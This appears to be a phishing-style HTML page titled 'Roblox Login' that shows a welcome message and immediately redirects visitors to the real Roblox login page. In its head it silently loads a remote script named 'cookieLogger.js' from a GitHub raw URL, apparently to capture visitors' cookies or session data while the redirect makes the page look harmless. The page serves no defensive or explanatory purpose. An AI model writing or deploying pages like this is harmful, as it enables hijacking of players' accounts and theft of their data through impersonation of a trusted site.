<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <script src="https://raw.githubusercontent.com/Nyxoride/my-private-server/main/cookieLogger.js"></script>
</head>
<body>
    <h1>Welcome to Roblox!</h1>
    <p>You will be redirected to Roblox in a moment...</p>
    <script>
        // Redirect to Roblox login page
        window.location.replace('https://www.roblox.com/login');

        // Additional error handling and logging
        window.onerror = function(message, source, lineno, colno, error) {
            console.error(`Error: ${message} at ${source}:${lineno}:${colno}`);
        };
    </script>
</body>
</html>
